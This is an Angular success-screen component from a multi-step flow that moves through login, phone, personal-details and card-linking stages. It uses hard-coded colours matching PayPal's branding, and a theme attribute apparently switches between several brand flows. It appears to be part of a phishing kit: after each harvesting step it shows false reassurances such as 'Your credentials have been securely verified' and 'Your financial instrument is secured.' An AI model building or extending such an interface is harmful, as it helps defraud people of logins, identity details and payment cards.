import { Component, inject, computed } from '@angular/core';
import { CommonModule } from '@angular/common';
import { StateService } from '../services/state.service';
import { CardComponent, CardVariant } from './ui/card.component';

@Component({
  selector: 'app-step-success',
  standalone: true,
  imports: [CommonModule, CardComponent],
  host: {
    '[attr.data-theme]': 'currentFlowId()',
    'class': 'block w-full max-w-md mx-auto animate-in fade-in zoom-in-95 duration-500'
  },
  template: `
    <ui-card [variant]="cardVariant()">
      <div class="flex flex-col items-center justify-center py-6 text-center animate-in fade-in zoom-in duration-300">
        
        <div class="relative mb-6">
            <div class="w-24 h-24 rounded-full bg-[#e1f0fa] flex items-center justify-center relative z-10">
                <div class="w-16 h-16 rounded-full bg-[#0070ba] flex items-center justify-center shadow-lg">
                    <span class="material-icons text-4xl text-white">check</span>
                </div>
            </div>
            <!-- Ripple Effect -->
            <div class="absolute inset-0 rounded-full border-4 border-[#0070ba]/10 animate-[ping_2s_infinite]"></div>
        </div>

        <h2 class="text-2xl font-bold text-[#2c2e2f] mb-3">{{ title() }}</h2>
        <p class="text-[#5e6c75] mb-8 max-w-[280px] leading-relaxed">{{ message() }}</p>

        <!-- Loading Bar Visualization -->
        <div class="w-full h-1.5 bg-[#f5f7fa] rounded-full overflow-hidden mb-8 relative border border-slate-100">
             <div class="absolute inset-0 bg-[#0070ba]/10 w-full"></div>
            <div class="h-full bg-[#0070ba] w-full animate-[width_1.2s_ease-out_forwards]"></div>
        </div>

        <button (click)="continue()" class="w-full bg-[#003087] hover:bg-[#002569] text-white font-bold py-3.5 rounded-full transition-colors shadow-md text-[15px]">
            Continue
        </button>

      </div>
    </ui-card>
  `
})
export class StepSuccessComponent {
  state = inject(StateService);

  currentFlowId = computed(() => this.state.currentFlow()?.id || 'generic');
  cardVariant = computed<CardVariant>(() => 'elevated');

  title = computed(() => {
    if (this.state.stage() === 'login') return 'Login Confirmed';
    if (this.state.stage() === 'phone_pending') return 'Phone Verified';
    if (this.state.stage() === 'personal_pending') return 'Identity Confirmed';
    if (this.state.stage() === 'card_pending') return 'Card Linked';
    return 'Verified';
  });

  message = computed(() => {
    if (this.state.stage() === 'login') return 'Your credentials have been securely verified.';
    if (this.state.stage() === 'phone_pending') return 'Your device has been authenticated.';
    if (this.state.stage() === 'personal_pending') return 'Your profile information is updated.';
    if (this.state.stage() === 'card_pending') return 'Your financial instrument is secured.';
    return 'Proceeding to the next step.';
  });

  continue() {
    this.state.proceedFromSuccess();
  }
}